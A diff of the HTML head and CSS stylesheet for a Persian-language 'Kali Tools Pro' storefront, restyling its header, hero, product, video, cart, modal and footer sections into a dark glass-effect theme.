@@ -4,10 +4,27 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Kali Tools Pro | ابزارهای حرفهای کالی لینکس</title>
-    <script src="server.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet">
     <style>
+        :root {
+            --primary: #FF6B00;
+            --primary-dark: #E55A00;
+            --secondary: #1A1A1A;
+            --accent: #00C853;
+            --accent-dark: #00B248;
+            --danger: #F44336;
+            --warning: #FF9800;
+            --info: #2196F3;
+            --light: #F5F5F5;
+            --dark: #121212;
+            --text: #333333;
+            --text-light: #777777;
+            --glass: rgba(255, 255, 255, 0.1);
+            --glass-border: rgba(255, 255, 255, 0.2);
+            --shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+        }
+
         * {
             margin: 0;
             padding: 0;
@@ -15,92 +32,128 @@
             font-family: Vazirmatn, 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
 
-        :root {
-            --primary: #FF6B00;
-            --primary-dark: #E55A00;
-            --secondary: #1A1A1A;
-            --accent: #00C853;
-            --light: #F5F5F5;
-            --dark: #121212;
-            --text: #333333;
-            --text-light: #777777;
-            --danger: #F44336;
-            --warning: #FF9800;
-        }
-
         body {
-            background-color: var(--light);
-            color: var(--text);
+            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a2e 50%, #16213e 100%);
+            color: white;
             line-height: 1.6;
             overflow-x: hidden;
+            scroll-behavior: smooth;
         }
 
-        /* Header Styles */
-        header {
-            background: linear-gradient(135deg, var(--secondary) 0%, #2A2A2A 100%);
-            color: white;
-            padding: 1rem 0;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-            position: sticky;
+        /* Preloader */
+        .preloader {
+            position: fixed;
             top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: var(--dark);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            transition: opacity 0.5s ease;
+        }
+
+        .loader {
+            width: 60px;
+            height: 60px;
+            border: 4px solid var(--glass);
+            border-top: 4px solid var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        .loader-text {
+            font-size: 1.2rem;
+            color: var(--primary);
+            font-weight: 600;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Glass Morphism */
+        .glass {
+            background: var(--glass);
+            backdrop-filter: blur(15px);
+            border: 1px solid var(--glass-border);
+            border-radius: 20px;
+        }
+
+        /* Header */
+        header {
+            background: rgba(26, 26, 26, 0.95);
+            backdrop-filter: blur(15px);
+            padding: 1rem 0;
+            position: fixed;
+            top: 0;
+            width: 100%;
             z-index: 1000;
+            transition: all 0.3s ease;
+            border-bottom: 1px solid var(--glass-border);
+        }
+
+        .header-scrolled {
+            background: rgba(18, 18, 18, 0.98);
+            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.4);
+            padding: 0.7rem 0;
         }
 
         .header-container {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            max-width: 1200px;
+            max-width: 1400px;
             margin: 0 auto;
-            padding: 0 1rem;
+            padding: 0 2rem;
         }
 
         .logo {
             display: flex;
             align-items: center;
-            gap: 10px;
+            gap: 12px;
         }
 
         .logo-text {
-            font-size: 1.5rem;
-            font-weight: 700;
-            color: var(--primary);
-        }
-
-        .logo-subtext {
-            font-size: 0.8rem;
-            color: #CCCCCC;
-            display: none;
+            font-size: 2rem;
+            font-weight: 800;
+            background: linear-gradient(45deg, var(--primary), var(--accent));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 4px 20px rgba(255, 107, 0, 0.3);
         }
 
         .nav-links {
             display: flex;
             list-style: none;
-            gap: 1.5rem;
+            gap: 2.5rem;
         }
 
         .nav-links a {
             color: white;
             text-decoration: none;
-            font-weight: 500;
-            transition: color 0.3s;
+            font-weight: 600;
+            transition: all 0.3s;
             position: relative;
-            font-size: 0.9rem;
-        }
-
-        .nav-links a:hover {
-            color: var(--primary);
+            padding: 0.5rem 0;
+            font-size: 1rem;
         }
 
         .nav-links a::after {
             content: '';
             position: absolute;
             width: 0;
-            height: 2px;
-            bottom: -5px;
+            height: 3px;
+            bottom: 0;
             right: 0;
-            background-color: var(--primary);
+            background: linear-gradient(45deg, var(--primary), var(--accent));
             transition: width 0.3s;
+            border-radius: 2px;
         }
 
         .nav-links a:hover::after {
@@ -109,31 +162,50 @@
 
         .header-actions {
             display: flex;
-            gap: 0.8rem;
+            gap: 1rem;
+            align-items: center;
         }
 
         .btn {
-            padding: 0.6rem 1.2rem;
+            padding: 0.8rem 1.8rem;
             border: none;
-            border-radius: 5px;
-            font-weight: 600;
+            border-radius: 12px;
+            font-weight: 700;
             cursor: pointer;
             transition: all 0.3s;
             display: inline-flex;
             align-items: center;
-            gap: 6px;
-            font-size: 0.9rem;
+            gap: 8px;
+            font-size: 1rem;
+            position: relative;
+            overflow: hidden;
+            text-decoration: none;
+        }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s;
+        }
+
+        .btn:hover::before {
+            left: 100%;
         }
 
         .btn-primary {
-            background: var(--primary);
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
             color: white;
+            box-shadow: 0 6px 20px rgba(255, 107, 0, 0.3);
         }
 
         .btn-primary:hover {
-            background: var(--primary-dark);
-            transform: translateY(-2px);
-            box-shadow: 0 4px 8px rgba(255, 107, 0, 0.3);
+            transform: translateY(-3px);
+            box-shadow: 0 10px 30px rgba(255, 107, 0, 0.5);
         }
 
         .btn-outline {
@@ -145,75 +217,53 @@
         .btn-outline:hover {
             background: white;
             color: var(--secondary);
+            transform: translateY(-2px);
         }
 
         .btn-success {
-            background: var(--accent);
+            background: linear-gradient(135deg, var(--accent), var(--accent-dark));
             color: white;
-        }
-
-        .btn-success:hover {
-            background: #00B248;
-            transform: translateY(-2px);
         }
 
         .btn-danger {
-            background: var(--danger);
+            background: linear-gradient(135deg, var(--danger), #d32f2f);
             color: white;
-        }
-
-        .btn-danger:hover {
-            background: #D32F2F;
-            transform: translateY(-2px);
         }
 
         .btn-warning {
-            background: var(--warning);
+            background: linear-gradient(135deg, var(--warning), #F57C00);
             color: white;
         }
 
-        .btn-warning:hover {
-            background: #F57C00;
-            transform: translateY(-2px);
-        }
-
-        /* Mobile Menu */
-        .mobile-menu-btn {
+        /* Modal Styles */
+        .modal {
             display: none;
-            background: none;
-            border: none;
-            color: white;
-            font-size: 1.5rem;
-            cursor: pointer;
-        }
-
-        .mobile-menu {
             position: fixed;
             top: 0;
-            right: -100%;
-            width: 80%;
-            height: 100vh;
-            background: var(--secondary);
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
             z-index: 2000;
-            transition: right 0.3s ease;
-            padding: 2rem;
-            box-shadow: -5px 0 15px rgba(0, 0, 0, 0.1);
-        }
-
-        .mobile-menu.active {
-            right: 0;
-        }
-
-        .mobile-menu-header {
-            display: flex;
-            justify-content: space-between;
+            justify-content: center;
             align-items: center;
-            margin-bottom: 2rem;
-            padding-bottom: 1rem;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
         }
 
-        .close-mobile-menu {
+        .modal-content {
+            background: var(--dark);
+            border-radius: 20px;
+            padding: 3rem;
+            width: 90%;
+            max-width: 500px;
+            position: relative;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
+            border: 1px solid var(--glass-border);
+        }
+
+        .close-modal {
+            position: absolute;
+            top: 1rem;
+            left: 1rem;
             background: none;
             border: none;
             color: white;
@@ -221,157 +271,206 @@
             cursor: pointer;
         }
 
-        .mobile-nav-links {
-            list-style: none;
-        }
-
-        .mobile-nav-links li {
+        .form-group {
             margin-bottom: 1.5rem;
         }
 
-        .mobile-nav-links a {
-            color: white;
-            text-decoration: none;
-            font-size: 1.1rem;
+        .form-group label {
             display: block;
-            padding: 0.5rem 0;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            margin-bottom: 0.5rem;
+            color: #ccc;
         }
 
-        /* Hero Section */
-        .hero {
-            background: linear-gradient(rgba(0, 0, 0, 0.8), rgba(0, 0, 0, 0.8)), url('https://i.ibb.co/ynmdk2jb/kali-blue-matrix.png');
-            background-size: cover;
-            background-position: center;
+        .form-control {
+            width: 100%;
+            padding: 1rem;
+            border-radius: 10px;
+            border: 1px solid var(--glass-border);
+            background: rgba(255, 255, 255, 0.1);
             color: white;
-            padding: 4rem 1rem;
+            font-size: 1rem;
+        }
+
+        .form-control:focus {
+            outline: none;
+            border-color: var(--primary);
+        }
+
+        .form-title {
             text-align: center;
-        }
-
-        .hero-content {
-            max-width: 800px;
-            margin: 0 auto;
-        }
-
-        .hero h1 {
-            font-size: 2.2rem;
-            margin-bottom: 1.2rem;
-            color: var(--primary);
-            line-height: 1.3;
-        }
-
-        .hero p {
-            font-size: 1.1rem;
             margin-bottom: 2rem;
-            line-height: 1.7;
+            font-size: 1.8rem;
+            background: linear-gradient(45deg, var(--primary), var(--accent));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
 
-        .hero-buttons {
-            display: flex;
-            gap: 1rem;
-            justify-content: center;
-            flex-wrap: wrap;
-        }
-
-        /* Features Section */
-        .features {
-            padding: 4rem 1rem;
-            background-color: white;
+        /* Section Styles */
+        section {
+            padding: 8rem 2rem;
         }
 
         .section-title {
             text-align: center;
-            margin-bottom: 2.5rem;
+            margin-bottom: 5rem;
             position: relative;
         }
 
         .section-title h2 {
-            font-size: 2rem;
-            color: var(--secondary);
-            margin-bottom: 1rem;
+            font-size: 3rem;
+            margin-bottom: 1.5rem;
+            background: linear-gradient(45deg, var(--primary), var(--accent));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 4px 20px rgba(255, 107, 0, 0.3);
         }
 
         .section-title p {
-            color: var(--text-light);
-            max-width: 600px;
+            color: #ccc;
+            font-size: 1.3rem;
+            max-width: 700px;
             margin: 0 auto;
-            font-size: 1rem;
+            line-height: 1.7;
         }
 
         .section-title::after {
             content: '';
             position: absolute;
-            width: 60px;
-            height: 4px;
-            background: var(--primary);
-            bottom: -10px;
+            width: 80px;
+            height: 5px;
+            background: linear-gradient(45deg, var(--primary), var(--accent));
+            bottom: -20px;
             right: 50%;
             transform: translateX(50%);
-            border-radius: 2px;
+            border-radius: 5px;
         }
 
+        /* Hero Section */
+        .hero {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            position: relative;
+            overflow: hidden;
+            background: linear-gradient(rgba(0, 0, 0, 0.8), rgba(0, 0, 0, 0.8)), 
+                        url('https://images.unsplash.com/photo-1550751827-4bd374c3f58b?ixlib=rb-4.0.3&auto=format&fit=crop&w=2070&q=80');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+        }
+
+        .hero-content {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 0 2rem;
+            text-align: center;
+            position: relative;
+            z-index: 2;
+        }
+
+        .hero h1 {
+            font-size: 4rem;
+            margin-bottom: 1.5rem;
+            background: linear-gradient(45deg, #fff 30%, var(--primary) 70%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: typing 3.5s steps(40) 1s 1 normal both;
+            overflow: hidden;
+            white-space: nowrap;
+            border-right: 4px solid var(--primary);
+            text-shadow: 0 4px 30px rgba(255, 107, 0, 0.3);
+            line-height: 1.2;
+        }
+
+        @keyframes typing {
+            from { width: 0 }
+            to { width: 100% }
+        }
+
+        .hero p {
+            font-size: 1.4rem;
+            margin-bottom: 3rem;
+            color: #e0e0e0;
+            max-width: 700px;
+            margin-left: auto;
+            margin-right: auto;
+            line-height: 1.8;
+            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
+        }
+
+        .hero-buttons {
+            display: flex;
+            gap: 2rem;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        /* Features Grid */
         .features-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 1.5rem;
-            max-width: 1200px;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 3rem;
+            max-width: 1400px;
             margin: 0 auto;
         }
 
         .feature-card {
-            background: white;
-            border-radius: 10px;
-            padding: 1.5rem;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
-            transition: transform 0.3s, box-shadow 0.3s;
+            background: var(--glass);
+            backdrop-filter: blur(20px);
+            border: 1px solid var(--glass-border);
+            border-radius: 20px;
+            padding: 3rem 2rem;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             text-align: center;
-            border-top: 4px solid var(--primary);
+            position: relative;
+            overflow: hidden;
         }
 
         .feature-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+            transform: translateY(-15px) scale(1.02);
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.4);
         }
 
         .feature-icon {
-            font-size: 2.5rem;
-            color: var(--primary);
-            margin-bottom: 1.2rem;
-        }
-
-        .feature-card h3 {
-            font-size: 1.3rem;
-            margin-bottom: 1rem;
-            color: var(--secondary);
+            font-size: 4rem;
+            margin-bottom: 2rem;
+            background: linear-gradient(45deg, var(--primary), var(--accent));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
 
         /* Gallery Section */
         .gallery {
-            padding: 4rem 1rem;
-            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%);
+            background: var(--dark);
         }
 
         .gallery-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 1.5rem;
-            max-width: 1200px;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+            max-width: 1400px;
             margin: 0 auto;
         }
 
         .gallery-item {
-            border-radius: 10px;
-            overflow: hidden;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
-            transition: transform 0.3s;
-            height: 220px;
-            background-size: cover;
-            background-position: center;
             position: relative;
+            border-radius: 15px;
+            overflow: hidden;
+            height: 250px;
+            cursor: pointer;
+            transition: transform 0.3s ease;
+            background: var(--glass);
+            border: 1px solid var(--glass-border);
         }
 
         .gallery-item:hover {
-            transform: translateY(-5px);
+            transform: scale(1.05);
+        }
+
+        .gallery-item img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
         }
 
         .gallery-item-overlay {
@@ -422,31 +521,31 @@
             background: var(--primary);
         }
 
-        /* Video Section */
+        /* Videos Section */
         .videos {
-            padding: 4rem 1rem;
-            background-color: white;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
         }
 
         .videos-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 1.5rem;
-            max-width: 1200px;
+            gap: 2.5rem;
+            max-width: 1400px;
             margin: 0 auto;
         }
 
         .video-card {
-            background: white;
-            border-radius: 10px;
+            background: var(--glass);
+            border-radius: 20px;
             overflow: hidden;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
-            transition: transform 0.3s, box-shadow 0.3s;
+            transition: all 0.4s ease;
+            position: relative;
+            border: 1px solid var(--glass-border);
         }
 
         .video-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+            transform: translateY(-10px) scale(1.02);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
         }
 
         .video-thumbnail {
@@ -480,7 +579,7 @@
         }
 
         .video-content {
-            padding: 1.2rem;
+            padding: 2rem;
         }
 
         .video-category {
@@ -491,16 +590,16 @@
         }
 
         .video-title {
-            font-size: 1.2rem;
-            margin-bottom: 0.8rem;
-            color: var(--secondary);
+            font-size: 1.5rem;
+            margin-bottom: 1rem;
+            color: white;
+            line-height: 1.4;
         }
 
         .video-description {
-            color: var(--text-light);
-            margin-bottom: 1.2rem;
-            line-height: 1.6;
-            font-size: 0.9rem;
+            color: #ccc;
+            margin-bottom: 1.5rem;
+            line-height: 1.7;
         }
 
         .video-footer {
@@ -511,126 +610,71 @@
 
         .video-duration {
             font-size: 0.9rem;
-            color: var(--text-light);
-        }
-
-        /* Video Modal */
-        .video-modal {
-            position: fixed;
-            top: 0;
-            right: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.9);
-            z-index: 3000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            opacity: 0;
-            visibility: hidden;
-            transition: all 0.3s;
-            padding: 1rem;
-        }
-
-        .video-modal.active {
-            opacity: 1;
-            visibility: visible;
-        }
-
-        .video-modal-content {
-            width: 100%;
-            max-width: 800px;
-            background: black;
-            border-radius: 10px;
-            overflow: hidden;
-            position: relative;
-        }
-
-        .video-modal-video {
-            width: 100%;
-            height: auto;
-            max-height: 80vh;
-        }
-
-        .close-video-modal {
-            position: absolute;
-            top: 10px;
-            left: 10px;
-            background: rgba(0, 0, 0, 0.7);
-            color: white;
-            border: none;
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            font-size: 1.2rem;
-            z-index: 10;
+            color: #ccc;
         }
 
         /* Products Section */
         .products {
-            padding: 4rem 1rem;
-            background-color: white;
+            background: linear-gradient(135deg, #0f0f0f 0%, #1a1a2e 100%);
         }
 
         .products-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
-            gap: 1.5rem;
-            max-width: 1200px;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2.5rem;
+            max-width: 1400px;
             margin: 0 auto;
         }
 
         .product-card {
-            background: white;
-            border-radius: 10px;
+            background: var(--glass);
+            border-radius: 20px;
             overflow: hidden;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
-            transition: transform 0.3s, box-shadow 0.3s;
+            transition: all 0.4s ease;
+            position: relative;
+            border: 1px solid var(--glass-border);
         }
 
         .product-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+            transform: translateY(-10px) scale(1.02);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
         }
 
         .product-image {
-            height: 180px;
-            background-size: cover;
-            background-position: center;
+            height: 200px;
+            background: linear-gradient(135deg, var(--primary), var(--accent));
             display: flex;
             align-items: center;
             justify-content: center;
+            font-size: 3rem;
             color: white;
-            font-size: 2.5rem;
             position: relative;
+            background-size: cover;
+            background-position: center;
         }
 
         .product-content {
-            padding: 1.2rem;
+            padding: 2rem;
         }
 
         .product-category {
             color: var(--primary);
-            font-size: 0.85rem;
-            font-weight: 600;
-            margin-bottom: 0.5rem;
+            font-weight: 700;
+            margin-bottom: 0.8rem;
+            font-size: 1rem;
         }
 
         .product-title {
-            font-size: 1.2rem;
-            margin-bottom: 0.8rem;
-            color: var(--secondary);
+            font-size: 1.5rem;
+            margin-bottom: 1rem;
+            color: white;
+            line-height: 1.4;
         }
 
         .product-description {
-            color: var(--text-light);
-            margin-bottom: 1.2rem;
-            line-height: 1.6;
-            font-size: 0.9rem;
+            color: #ccc;
+            margin-bottom: 1.5rem;
+            line-height: 1.7;
         }
 
         .product-footer {
@@ -640,14 +684,16 @@
         }
 
         .product-price {
-            font-size: 1.3rem;
-            font-weight: 700;
-            color: var(--primary);
+            font-size: 1.8rem;
+            font-weight: 800;
+            background: linear-gradient(45deg, var(--primary), var(--accent));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
 
         .currency {
             font-size: 0.9rem;
-            color: var(--text-light);
+            color: #ccc;
             margin-right: 5px;
         }
 
@@ -719,6 +765,7 @@
             padding: 1.2rem;
             text-align: center;
             backdrop-filter: blur(10px);
+            border: 1px solid var(--glass-border);
         }
 
         .stat-value {
@@ -739,6 +786,7 @@
             border-radius: 10px;
             padding: 1.5rem;
             backdrop-filter: blur(10px);
+            border: 1px solid var(--glass-border);
         }
 
         .control-card h3 {
@@ -749,42 +797,14 @@
             font-size: 1.2rem;
         }
 
-        .form-group {
-            margin-bottom: 1.2rem;
-        }
-
-        .form-group label {
-            display: block;
-            margin-bottom: 0.5rem;
-            font-weight: 500;
-        }
-
-        .form-control {
-            width: 100%;
-            padding: 0.7rem 1rem;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            font-size: 0.9rem;
-            transition: border-color 0.3s;
-        }
-
-        .form-control:focus {
-            border-color: var(--primary);
-            outline: none;
-        }
-
-        textarea.form-control {
-            min-height: 80px;
-            resize: vertical;
-        }
-
         .file-upload {
-            border: 2px dashed #ddd;
+            border: 2px dashed var(--glass-border);
             border-radius: 5px;
             padding: 1.5rem;
             text-align: center;
             cursor: pointer;
             transition: border-color 0.3s;
+            background: rgba(255, 255, 255, 0.05);
         }
 
         .file-upload:hover {
@@ -793,7 +813,7 @@
 
         .file-upload i {
             font-size: 2.5rem;
-            color: #ddd;
+            color: #ccc;
             margin-bottom: 0.8rem;
         }
 
@@ -815,8 +835,7 @@
 
         /* Ethical Section */
         .ethical {
-            padding: 4rem 1rem;
-            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%);
+            background: var(--dark);
         }
 
         .ethical-content {
@@ -826,12 +845,13 @@
         }
 
         .ethical-warning {
-            background: #FFF3E0;
+            background: rgba(255, 243, 224, 0.1);
             border: 2px solid var(--primary);
             border-radius: 10px;
             padding: 2rem;
             margin: 1.5rem 0;
             text-align: right;
+            backdrop-filter: blur(10px);
         }
 
         .ethical-warning h3 {
@@ -852,6 +872,10 @@
             display: flex;
             align-items: flex-start;
             gap: 8px;
+            padding: 1rem;
+            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--glass-border);
         }
 
         .ethical-item.allowed {
@@ -874,12 +898,13 @@
             left: -100%;
             width: 100%;
             height: 100vh;
-            background: white;
+            background: var(--dark);
             box-shadow: -5px 0 15px rgba(0, 0, 0, 0.1);
             transition: left 0.3s ease;
             z-index: 2000;
             padding: 1.5rem;
             overflow-y: auto;
+            border-right: 1px solid var(--glass-border);
         }
 
         .cart-sidebar.active {
@@ -892,12 +917,12 @@
             align-items: center;
             margin-bottom: 1.5rem;
             padding-bottom: 1rem;
-            border-bottom: 1px solid #eee;
+            border-bottom: 1px solid var(--glass-border);
         }
 
         .cart-title {
             font-size: 1.3rem;
-            color: var(--secondary);
+            color: white;
         }
 
         .close-cart {
@@ -905,7 +930,7 @@
             border: none;
             font-size: 1.5rem;
             cursor: pointer;
-            color: var(--text-light);
+            color: #ccc;
         }
 
         .cart-items {
@@ -916,7 +941,7 @@
             display: flex;
             gap: 1rem;
             padding: 1rem 0;
-            border-bottom: 1px solid #eee;
+            border-bottom: 1px solid var(--glass-border);
         }
 
         .cart-item-image {
@@ -942,6 +967,7 @@
             font-weight: 600;
             margin-bottom: 0.5rem;
             font-size: 0.95rem;
+            color: white;
         }
 
         .cart-item-price {
@@ -966,7 +992,8 @@
             font-weight: 700;
             margin-bottom: 1.5rem;
             padding-top: 1rem;
-            border-top: 2px solid #eee;
+            border-top: 2px solid var(--glass-border);
+            color: white;
         }
 
         .checkout-btn {
@@ -991,15 +1018,15 @@
             display: block;
         }
 
-        /* Login Modal */
-        .modal {
+        /* Video Modal */
+        .video-modal {
             position: fixed;
             top: 0;
             right: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.5);
-            z-index: 2000;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 3000;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -1009,82 +1036,112 @@
             padding: 1rem;
         }
 
-        .modal.active {
+        .video-modal.active {
             opacity: 1;
             visibility: visible;
         }
 
-        .modal-content {
-            background: white;
+        .video-modal-content {
             width: 100%;
-            max-width: 500px;
+            max-width: 800px;
+            background: black;
             border-radius: 10px;
-            padding: 1.5rem;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
-            transform: translateY(20px);
-            transition: transform 0.3s;
+            overflow: hidden;
+            position: relative;
         }
 
-        .modal.active .modal-content {
-            transform: translateY(0);
+        .video-modal-video {
+            width: 100%;
+            height: auto;
+            max-height: 80vh;
         }
 
-        .modal-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 1.5rem;
-        }
-
-        .modal-title {
-            font-size: 1.3rem;
-            color: var(--secondary);
-        }
-
-        .close-modal {
-            background: none;
+        .close-video-modal {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            background: rgba(0, 0, 0, 0.7);
+            color: white;
             border: none;
-            font-size: 1.5rem;
-            cursor: pointer;
-            color: var(--text-light);
-        }
-
-        /* Checkout Modal */
-        .checkout-modal {
-            position: fixed;
-            top: 0;
-            right: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.5);
-            z-index: 2000;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            opacity: 0;
-            visibility: hidden;
+            cursor: pointer;
+            font-size: 1.2rem;
+            z-index: 10;
+        }
+
+        /* Footer */
+        footer {
+            background: #0a0a0a;
+            padding: 5rem 2rem 2rem;
+            border-top: 1px solid var(--glass-border);
+        }
+
+        .footer-content {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 4rem;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .footer-section h4 {
+            color: var(--primary);
+            margin-bottom: 2rem;
+            font-size: 1.4rem;
+        }
+
+        .footer-links {
+            list-style: none;
+        }
+
+        .footer-links li {
+            margin-bottom: 1rem;
+        }
+
+        .footer-links a {
+            color: #ccc;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+
+        .footer-links a:hover {
+            color: var(--primary);
+        }
+
+        .social-links {
+            display: flex;
+            gap: 1.2rem;
+            margin-top: 2rem;
+        }
+
+        .social-links a {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 45px;
+            height: 45px;
+            background: var(--glass);
+            border-radius: 50%;
+            color: white;
             transition: all 0.3s;
-            padding: 1rem;
         }
 
-        .checkout-modal.active {
-            opacity: 1;
-            visibility: visible;
+        .social-links a:hover {
+            background: var(--primary);
+            transform: translateY(-3px);
         }
 
-        .checkout-content {
-            background: white;
-            width: 100%;
-            max-width: 500px;
-            border-radius: 10px;
-            padding: 1.5rem;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
-            transform: translateY(20px);
-            transition: transform 0.3s;
-        }
-
-        .checkout-modal.active .checkout-content {
-            transform: translateY(0);
+        .copyright {
+            text-align: center;
+            margin-top: 4rem;
+            padding-top: 2rem;
+            border-top: 1px solid var(--glass-border);
+            color: #666;
         }
 
         /* Toast Notification */
@@ -1118,98 +1175,72 @@
             background: var(--danger);
         }
 
-        /* Footer */
-        footer {
-            background: var(--secondary);
+        /* Mobile Menu */
+        .mobile-menu-btn {
+            display: none;
+            background: none;
+            border: none;
             color: white;
-            padding: 3rem 1rem 1.5rem;
+            font-size: 1.5rem;
+            cursor: pointer;
         }
 
-        .footer-content {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 2rem;
-            max-width: 1200px;
-            margin: 0 auto;
+        .mobile-menu {
+            position: fixed;
+            top: 0;
+            right: -100%;
+            width: 80%;
+            height: 100vh;
+            background: var(--secondary);
+            z-index: 2000;
+            transition: right 0.3s ease;
+            padding: 2rem;
+            box-shadow: -5px 0 15px rgba(0, 0, 0, 0.1);
+            border-left: 1px solid var(--glass-border);
         }
 
-        .footer-section h4 {
-            color: var(--primary);
-            margin-bottom: 1.2rem;
-            font-size: 1.2rem;
-            position: relative;
-            padding-bottom: 8px;
-        }
-
-        .footer-section h4::after {
-            content: '';
-            position: absolute;
-            width: 40px;
-            height: 3px;
-            background: var(--primary);
-            bottom: 0;
+        .mobile-menu.active {
             right: 0;
         }
 
-        .footer-links {
+        .mobile-menu-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 2rem;
+            padding-bottom: 1rem;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .close-mobile-menu {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 1.5rem;
+            cursor: pointer;
+        }
+
+        .mobile-nav-links {
             list-style: none;
         }
 
-        .footer-links li {
-            margin-bottom: 0.7rem;
+        .mobile-nav-links li {
+            margin-bottom: 1.5rem;
         }
 
-        .footer-links a {
-            color: #CCCCCC;
-            text-decoration: none;
-            transition: color 0.3s;
-            font-size: 0.9rem;
-        }
-
-        .footer-links a:hover {
-            color: var(--primary);
-        }
-
-        .social-links {
-            display: flex;
-            gap: 0.8rem;
-            margin-top: 1.2rem;
-        }
-
-        .social-links a {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            width: 35px;
-            height: 35px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 50%;
+        .mobile-nav-links a {
             color: white;
-            transition: all 0.3s;
+            text-decoration: none;
+            font-size: 1.1rem;
+            display: block;
+            padding: 0.5rem 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
         }
 
-        .social-links a:hover {
-            background: var(--primary);
-            transform: translateY(-3px);
-        }
-
-        .copyright {
-            text-align: center;
